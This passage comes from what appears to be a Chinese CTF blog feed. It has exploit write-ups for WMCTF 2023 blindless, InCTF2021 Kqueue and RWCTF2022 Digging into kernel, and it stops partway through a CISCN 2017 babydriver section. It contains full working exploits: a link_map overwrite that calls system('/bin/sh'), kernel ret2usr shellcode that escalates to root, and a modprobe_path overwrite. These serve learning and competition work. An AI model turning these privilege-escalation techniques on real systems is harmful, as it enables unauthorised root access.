l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);<br>    &#125;<br>              <br>……<br></code></pre></td></tr></table></figure><h2 id="例题：WMCTF-2023-blindless"><a href="#例题：WMCTF-2023-blindless" class="headerlink" title="例题：WMCTF - 2023 - blindless"></a>例题：WMCTF - 2023 - blindless</h2><p>利用的就是.fini_array段为空，则直接调用fini函数的分支</p><p>根据hint，我们可以申请一个大的data chunk（大于0x100000），这样就会调用mmap分配堆块，分配的堆块就在libc下方，libc和ld的相对地址是固定的，就可以通过越界写更改</p><p>我们可以更改elf的link_map（在ld里）</p><ul><li>更改_rtld_global._dl_load_lock.mutex为&#x2F;bin&#x2F;sh</li><li>更改l_addr为.init和system的plt的差值</li><li>更改l_info[DT_FINI]为l_info[DT_INIT]的值</li><li>更改l_info[DT_FINI_ARRAY]的值为0</li></ul><p><em><strong>为什么要这么构造？</strong></em></p><ul><li><p>.fini段的地址是0x1558，backdoor和system的plt的地址都在它之下，但改l_addr只能往后改不能往前改，所以要使l_info[DT_FINI]指向一个靠前的地址，这里我选则了l_info[DT_INIT]（0x1000）</p></li><li><p>使用system(‘&#x2F;bin&#x2F;sh’)而不是调用backdoor是因为</p><ul><li>system的plt和.init的差值为0xe0</li><li>backdoor和.init的差值为0x209</li></ul><p>如果要使用backdoor就要改两字节，涉及一个1&#x2F;16的爆破，对我来说爆破能没有最好没有：）</p></li></ul><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">offset, value</span>):<br>    code = <span class="hljs-string">b&#x27;&#x27;</span><br>    code += <span class="hljs-string">b&#x27;@&#x27;</span><br>    code += p32(offset)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> value:<br>        code += <span class="hljs-string">b&#x27;.&#x27;</span><br>        code += p8(i)<br>        code += <span class="hljs-string">b&#x27;&gt;&#x27;</span><br>    <span class="hljs-keyword">return</span> code<br><br>p = process(<span class="hljs-string">&#x27;./main&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Pls input the data size\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x100000</span>).encode())<br>code = write(<span class="hljs-number">0x325958</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>code += write(<span class="hljs-number">0x326180</span>-<span class="hljs-number">0x325958</span>-<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\xe0&#x27;</span>)<br>code += write(<span class="hljs-number">0x326228</span>-<span class="hljs-number">0x326180</span>-<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\x10&#x27;</span>)<br>code += write(<span class="hljs-number">0x326290</span>-<span class="hljs-number">0x326228</span>-<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>p.sendlineafter(<span class="hljs-string">b&#x27;Pls input the code size\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(code)+<span class="hljs-number">1</span>).encode())<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Pls input your code\n&#x27;</span>, code+<span class="hljs-string">b&#x27;q&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Stack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kernel Heap Heap-Overflow</title>
    <link href="/2023/08/20/kernel-heap-heap-overflow/"/>
    <url>/2023/08/20/kernel-heap-heap-overflow/</url>
    
    <content type="html"><![CDATA[<p>这题的代码真的是……一言难尽(ˉ▽ˉ；)…</p><p>ps：解包要用root</p><span id="more"></span><h1 id="例题：InCTF2021-Kqueue"><a href="#例题：InCTF2021-Kqueue" class="headerlink" title="例题：InCTF2021 - Kqueue"></a>例题：InCTF2021 - Kqueue</h1><p>这题的数据结构有点复杂（主要是代码写的太恶心了）</p><h2 id="数据结构分析"><a href="#数据结构分析" class="headerlink" title="数据结构分析"></a>数据结构分析</h2><ul><li><p>create_kqueue结束的数据结构</p><img src="/2023/08/20/kernel-heap-heap-overflow/struc1.png" class title="struc1"></li><li><p>edit_kqueue，写request-&gt;data</p><ul><li>如果request.entry_idx&#x3D;&#x3D;0，则写入queue-&gt;data</li><li>否则如果request.entry_idx&#x3D;&#x3D;kqueue_entry-&gt;idx，写入kqueue_entry-&gt;data</li></ul></li><li><p>save_kqueue_entries后的数据结构</p><img src="/2023/08/20/kernel-heap-heap-overflow/struc2.png" class title="struc2"></li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>主要漏洞是出在这里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Check if multiplication of 2 64 bit integers results in overflow */</span><br>ull space = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(__builtin_umulll_overflow(<span class="hljs-keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="hljs-number">1</span>),&amp;space) == <span class="hljs-literal">true</span>)<br>    err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br></code></pre></td></tr></table></figure><p>如果使request.max_entries&#x3D;0xffffffff，则request.max_entries+1会溢出为0，检测通过但还是溢出了</p><p>题外话：如果要检测溢出那么每一步计算操作都要有检测，但+1那步没有，所以出问题了</p><p>还有这题所有的错误判断其实都是无效的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">err</span><span class="hljs-params">(<span class="hljs-type">char</span>* msg)</span>&#123;<br>    printk(KERN_ALERT <span class="hljs-string">&quot;%s\n&quot;</span>,msg);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>虽然err有返回值但返回值并没有被使用，所以所有的判断都不用管（代码写的真是依托答辩O(∩_∩)O）</p><p>如果使request.max_entries&#x3D;0xffffffff，则数据结构如下：</p><ul><li><p>create_kqueue结束，只分配了一个queue大小为0x18，没有queue_entry</p><img src="/2023/08/20/kernel-heap-heap-overflow/struc3.png" class title="struc3"></li><li><p>edit_kqueue令request.entry_idx&#x3D;&#x3D;0，queue-&gt;data写入数据</p><img src="/2023/08/20/kernel-heap-heap-overflow/struc4.png" class title="struc4"></li><li><p>save_kqueue_entries将queue-&gt;data写入kqueue，data_size由request决定，因为可以随便溢出，所以我们可以修改下一个object（堆喷过程略）</p><img src="/2023/08/20/kernel-heap-heap-overflow/struc5.png" class title="struc5"></li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>shellcode函数是利用栈上的残留数据（其实是start函数的返回地址）计算prepare_kernel_cred和commit_creds地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CREATE_KQUEUE 0xDEADC0DE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EDIT_KQUEUE   0xDAADEEEE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELETE_KQUEUE 0xBADDCAFE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SAVE          0xB105BABE</span><br><br><span class="hljs-type">size_t</span> root_rip;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>&#123;</span><br>    <span class="hljs-type">uint16_t</span> idx;<br>    <span class="hljs-type">char</span> *data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">uint32_t</span> max_entries;<br>    <span class="hljs-type">uint16_t</span> data_size;<br>    <span class="hljs-type">uint16_t</span> entry_idx;<br>    <span class="hljs-type">uint16_t</span> queue_idx;<br>    <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-type">request_t</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">uint32_t</span> max_entries, <span class="hljs-type">uint16_t</span> data_size)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> rq = &#123;<br>        .max_entries = max_entries,<br>        .data_size = data_size,<br>    &#125;;<br>    ioctl(fd, CREATE_KQUEUE, &amp;rq);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">uint16_t</span> entry_idx, <span class="hljs-type">uint16_t</span> queue_idx, <span class="hljs-type">char</span> *data)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> rq = &#123;<br>        .entry_idx = entry_idx,<br>        .queue_idx = queue_idx,<br>        .data = data,<br>    &#125;;<br>    ioctl(fd, EDIT_KQUEUE, &amp;rq);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">uint32_t</span> max_entries, <span class="hljs-type">uint16_t</span> data_size, <span class="hljs-type">uint16_t</span> queue_idx)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> rq = &#123;<br>        .max_entries = max_entries,<br>        .data_size = data_size,<br>        .queue_idx = queue_idx,<br>    &#125;;<br>    ioctl(fd, SAVE, &amp;rq);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">shellcode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r12, [rsp + 0x8];&quot;</span><br>        <span class="hljs-string">&quot;sub r12, 0x201179;&quot;</span><br>        <span class="hljs-string">&quot;mov r13, r12;&quot;</span><br>        <span class="hljs-string">&quot;add r12, 0x8c580;&quot;</span>  <span class="hljs-comment">// prepare_kernel_cred</span><br>        <span class="hljs-string">&quot;add r13, 0x8c140;&quot;</span>  <span class="hljs-comment">// commit_creds</span><br>        <span class="hljs-string">&quot;xor rdi, rdi;&quot;</span><br>        <span class="hljs-string">&quot;call r12;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, rax;&quot;</span><br>        <span class="hljs-string">&quot;call r13;&quot;</span><br>        <span class="hljs-string">&quot;swapgs;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_ss;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_sp;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_rflags;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_cs;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, root_rip;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;iretq;&quot;</span><br>    );<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    root_rip = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    save_status();<br>    user_sp += <span class="hljs-number">8</span>;<br>    bindCore(<span class="hljs-number">0</span>);<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/kqueue&quot;</span>, O_RDONLY);<br>    create(fd, <span class="hljs-number">0xffffffff</span>, <span class="hljs-number">0x30</span>);<br>    <span class="hljs-type">size_t</span> fake_data[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, shellcode, shellcode&#125;;<br>    edit(fd, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, fake_data);<br>    <span class="hljs-type">int</span> seq_fd[<span class="hljs-number">0x200</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)<br>    &#123;<br>        seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>        <span class="hljs-keyword">if</span>(seq_fd[i] &lt; <span class="hljs-number">0</span>)<br>            fail_print(<span class="hljs-string">&quot;Open Fail!&quot;</span>);<br>    &#125;<br>    save(fd, <span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)<br>        read(seq_fd[i], buf, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>heap</tag>
      
      <tag>overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kernel Heap Arbitrary-Address-Allocation</title>
    <link href="/2023/08/18/kernel-heap-aaa/"/>
    <url>/2023/08/18/kernel-heap-aaa/</url>
    
    <content type="html"><![CDATA[<p>先跳过了条件竞争，堆喷遇到一个大问题就是nokaslr的时候利用不成功（好像是分配的时候出了问题），但开kaslr的时候调试不了……所以也先跳过了，这个看起来比较简单就先搞这个(⊙﹏⊙)</p><span id="more"></span><p>利用方式就是通过UAF更改object的next指针实现任意地址分配没啥好说的</p><p>上例题！</p><h1 id="例题：RWCTF2022高校赛-Digging-into-kernel"><a href="#例题：RWCTF2022高校赛-Digging-into-kernel" class="headerlink" title="例题：RWCTF2022高校赛 - Digging into kernel"></a>例题：RWCTF2022高校赛 - Digging into kernel</h1><p>主要分两步：泄露kernel基址和提权</p><h2 id="泄露kernel基址"><a href="#泄露kernel基址" class="headerlink" title="泄露kernel基址"></a>泄露kernel基址</h2><p>分两步</p><ul><li>通过object的next指针泄露一个堆中的地址来猜page_offset_base</li><li>page_offset_base+0x9d000处是secondary_startup_64的地址，可以由此计算kernel基址</li></ul><p><strong>为什么page_offset_base+0x9d000是secondary_startup_64的地址：</strong></p><p>0xffff888000000000-0xffffc87fffffffff是物理地址的线性映射区，所以page_offset_base+0x9d000应该是物理地址0x9d000，属于保护模式使用的内存区域，但这个地址在进入长模式时的内容还是0，所以这是为什么我也不知道（</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>覆写modprobe_path以root执行程序：</p><p>当执行（execve）一个非法的文件（file magic not found），会以root权限执行以modprobe_path为路径的可执行文件（默认值为&#x2F;sbin&#x2F;modprobe）</p><p>可以将modprobe_path更改为恶意脚本的路径（exp中间是改变flag的权限）</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MODPROBE_PATH 0x1444700</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> *content;<br>    <span class="hljs-type">int</span> index;<br>    <span class="hljs-type">int</span> size;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_buf</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-keyword">struct</span> data *data_ptr)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x7777777</span>, data_ptr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">alloc_buf</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-keyword">struct</span> data *data_ptr)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x1111111</span>, data_ptr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_buf</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-keyword">struct</span> data *data_ptr)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6666666</span>, data_ptr);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    bindCore(<span class="hljs-number">0</span>);<br><br>    system(<span class="hljs-string">&quot;echo \&quot;#!/bin/sh\nchmod 777 /flag\&quot; &gt; /home/getshell&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /home/getshell&quot;</span>);<br><br>    <span class="hljs-type">int</span> fd[<span class="hljs-number">3</span>], i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)<br>    &#123;<br>        fd[i] = open(<span class="hljs-string">&quot;/dev/xkmod&quot;</span>, O_RDONLY);<br>        <span class="hljs-keyword">if</span>(fd[i] &lt; <span class="hljs-number">0</span>)<br>            fail_print(<span class="hljs-string">&quot;Open Fail!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data</span> <span class="hljs-title">mydata</span>;</span><br>    mydata.content = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    mydata.index = <span class="hljs-number">0</span>;<br>    mydata.size = <span class="hljs-number">0x50</span>;<br>    <span class="hljs-built_in">memset</span>(mydata.content, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br><br>    alloc_buf(fd[<span class="hljs-number">0</span>], &amp;mydata);<br>    close(fd[<span class="hljs-number">0</span>]);<br><br>    read_buf(fd[<span class="hljs-number">1</span>], &amp;mydata);<br>    <span class="hljs-type">size_t</span> heap_base = mydata.content[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get the heap base : 0x%lx\033[0m\n&quot;</span>, heap_base);<br><br>    mydata.content[<span class="hljs-number">0</span>] = (<span class="hljs-type">size_t</span>)(heap_base + <span class="hljs-number">0x9d000</span> - <span class="hljs-number">0x10</span>);<br>    mydata.index = <span class="hljs-number">0</span>;<br>    mydata.size = <span class="hljs-number">8</span>;<br><br>    write_buf(fd[<span class="hljs-number">1</span>], &amp;mydata);<br><br>    mydata.size = <span class="hljs-number">0x18</span>;<br>    alloc_buf(fd[<span class="hljs-number">1</span>], &amp;mydata);<br>    alloc_buf(fd[<span class="hljs-number">1</span>], &amp;mydata);<br>    read_buf(fd[<span class="hljs-number">1</span>], &amp;mydata);<br><br>    <span class="hljs-type">size_t</span> kernel_base = mydata.content[<span class="hljs-number">2</span>] - <span class="hljs-number">0x30</span>;<br>    <span class="hljs-keyword">if</span>((kernel_base &amp; <span class="hljs-number">0xfff</span>) != <span class="hljs-number">0</span>)<br>        fail_print(<span class="hljs-string">&quot;Leak Kernel Base Error!&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get kernel base : 0x%lx\033[0m\n&quot;</span>, kernel_base);<br><br>    alloc_buf(fd[<span class="hljs-number">1</span>], &amp;mydata);<br>    close(fd[<span class="hljs-number">1</span>]);<br><br>    mydata.size = <span class="hljs-number">8</span>;<br>    mydata.content[<span class="hljs-number">0</span>] = MODPROBE_PATH - <span class="hljs-number">0x10</span> + kernel_base;<br>    write_buf(fd[<span class="hljs-number">2</span>], &amp;mydata);<br><br>    alloc_buf(fd[<span class="hljs-number">2</span>], &amp;mydata);<br>    alloc_buf(fd[<span class="hljs-number">2</span>], &amp;mydata);<br>    mydata.content[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    mydata.content[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    mydata.size = <span class="hljs-number">0x20</span>;<br>    <span class="hljs-built_in">strcpy</span>(&amp;mydata.content[<span class="hljs-number">2</span>], <span class="hljs-string">&quot;/home/getshell\0&quot;</span>);<br>    write_buf(fd[<span class="hljs-number">2</span>], &amp;mydata);<br><br>    system(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /home/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;/home/fake&quot;</span>);<br><br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">memset</span>(flag, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>);<br>    <span class="hljs-type">int</span> flag_fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span>(flag_fd &lt; <span class="hljs-number">0</span>)<br>        fail_print(<span class="hljs-string">&quot;Fail Open flag!&quot;</span>);<br>    read(flag_fd, flag, <span class="hljs-keyword">sizeof</span>(flag));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] flag : %s\033[0m\n&quot;</span>, flag);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>heap</tag>
      
      <tag>uaf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kernel Heap UAF</title>
    <link href="/2023/08/16/kernel-heap-uaf/"/>
    <url>/2023/08/16/kernel-heap-uaf/</url>
    
    <content type="html"><![CDATA[<p>手腕疼死了，这几天啥都没干成……今天终于好点了</p><p>打算先做题，等对内存分配机制有点实感再细看源码</p><span id="more"></span><p>从例题说起</p><h1 id="例题：CISCN-2017-babydriver"><a href="#例题：CISCN-2017-babydriver" class="headerlink" title="例题：CISCN - 2017 - babydriver"></a>例题：CISCN - 2017 - babydriver</h1><p>这道题开了-enable-kvm，打断点要用hbreak（硬件断点）</p><h2 id="覆写cred结构体"><a href="#覆写cred结构体" class="headerlink" title="覆写cred结构体"></a>覆写cred结构体</h2><p>思路就是释放的0xa8的堆块会被重新申请用作cred结构体，这样就能利用UAF将cred结构体的uid、guid改成0</p><p>这种方法在较新版本的kernel中已经不可行了，因为新版本在创建cred_jar时设置了SLAB_ACCOUNT标志，当CONFIG_MEMCG_KMEM&#x3D;y（默认）cred_jar不会和相同大小的kmalloc_192合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 旧版本cred_init</span><br><span class="hljs-type">void</span> __init <span class="hljs-title function_">cred_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">/* allocate a slab in which we can store credentials */</span><br>cred_jar = kmem_cache_create(<span class="hljs-string">&quot;cred_jar&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> cred), <span class="hljs-number">0</span>,<br>SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 新版本cred_init</span><br><span class="hljs-type">void</span> __init 